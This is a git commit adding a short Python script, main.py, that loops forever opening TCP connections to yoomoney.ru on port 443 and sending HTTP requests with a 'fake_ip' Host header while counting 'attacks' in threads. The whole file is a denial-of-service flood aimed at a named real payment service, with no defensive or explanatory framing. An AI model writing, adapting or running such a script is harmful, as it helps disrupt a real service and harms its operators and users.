0968d81ac4e60e02271f29ac80e69e482ff8edc2
1-off <97915378+1-off@users.noreply.github.com>
2022-03-02 03:22:59 +0100

    Add files via upload

---
+++ main.py
@@ -0,0 +1,30 @@
+
+import socket
+import threading
+
+target = 'yoomoney.ru'
+fake_ip = '217.107.219.57'
+port = 443
+max_threads = 1
+
+hostname = socket.gethostname()
+ip = socket.gethostbyname(hostname)
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+
+        s.close()
+
+for i in range(max_threads):
+    thread = threading.Thread(target=attack)
+    thread.start()
